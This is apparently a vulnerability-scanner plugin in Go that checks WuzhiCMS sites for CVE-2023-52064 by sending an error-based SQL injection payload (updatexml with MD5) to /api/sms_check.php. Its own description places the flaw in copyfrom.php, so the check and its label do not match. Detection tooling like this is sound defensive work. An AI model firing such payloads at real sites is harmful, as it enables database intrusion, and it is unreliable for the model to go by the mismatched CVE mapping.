package goplugin

import (
	"Yscanner/utils"
	"crypto/md5"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("wuzhiCMS_sqli_cve_2023_52064", &wuzhiCMS_sqli_cve_2023_52064{})
}

type wuzhiCMS_sqli_cve_2023_52064 struct{}

func (p *wuzhiCMS_sqli_cve_2023_52064) Info() PluginInfo {
	return PluginInfo{
		Name:     "wuzhiCMS copyfrom.php SQL注入漏洞",
		VulnInfo: "WUZHI CMS是五指（WUZHI）公司的一套基于PHP和MySQL的开源内容管理系统（CMS）。WUZHI CMS 存在安全漏洞，该漏洞源于 /core/admin/copyfrom.php 中的 $keywords 参数存在 SQL 注入漏洞。",
		VulnID:   "CVE-2023-52064",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "wuzhiCMS <= 4.1.0",
		CWE:      "CWE-89	SQL注入",
	}
}

func (p *wuzhiCMS_sqli_cve_2023_52064) Check(netloc string) bool {
	rand_str := strconv.Itoa(utils.GenRandomInt(5))
	payload := fmt.Sprintf("/api/sms_check.php?param=1%%27%%20and%%20updatexml(1,concat(0x7e,(SELECT%%20MD5(%s)),0x7e),1)--%%20", rand_str)

	req, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 5)
	if err != nil {
		return false
	}

	md5_str := MD5(rand_str)
	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, md5_str[:len(md5_str)-1]) {
		return true
	}
	return false
}

func MD5(str string) string {
	data := []byte(str)
	has := md5.Sum(data)
	md5str := fmt.Sprintf("%x", has)
	return strings.ToLower(md5str)
}
